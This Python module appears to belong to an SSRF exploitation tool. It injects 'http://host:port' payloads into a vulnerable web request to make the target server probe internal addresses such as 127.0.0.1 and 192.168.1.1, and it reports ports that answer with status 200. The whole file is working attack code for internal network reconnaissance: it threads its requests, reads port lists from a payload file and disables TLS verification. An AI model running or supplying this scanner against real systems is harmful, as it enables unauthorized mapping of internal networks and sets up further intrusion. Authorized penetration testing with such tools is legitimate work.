import ipaddress
import httpx
from Utils.runThread import run_threads
from Utils.makeRequest import make_request

def scanPort(client, request_info, params, network, port, url):
    try:
        method, _, header, body = request_info
        payload = f"http://{network}:{port}"

        response = make_request(client, method, url, header, body, params, payload)
        if response.status_code == 200:
            return f"[+] Port {port} is open."

    except httpx.RequestError:
        return


def run(request_info, params, url):
    try:
        print("Suggested targets: 127.0.0.1, 192.168.1.1, 10.0.0.1")
        network_target = input("Target host IP: ").strip()
        ipaddress.ip_address(network_target)

        with open("PayloadSSRF/Port.txt", "r") as f:
            ports = [int(line.strip()) for line in f if line.strip().isdigit()]

        if not ports:
            print("Error: No valid ports found in PayloadSSRF/Port.txt.")
            return

        print(f"\nScanning {len(ports)} ports on {network_target}...")

        with httpx.Client(http2=True, verify=False, timeout=10) as client:
            def worker(port):
                return scanPort(client, request_info, params, network_target, port, url)

            run_threads(ports, worker)

        print("Port scan completed.")
    except ValueError:
        print("Invalid IP target. Example: 192.168.1.10")
    except FileNotFoundError:
        print("Error: PayloadSSRF/Port.txt not found.")

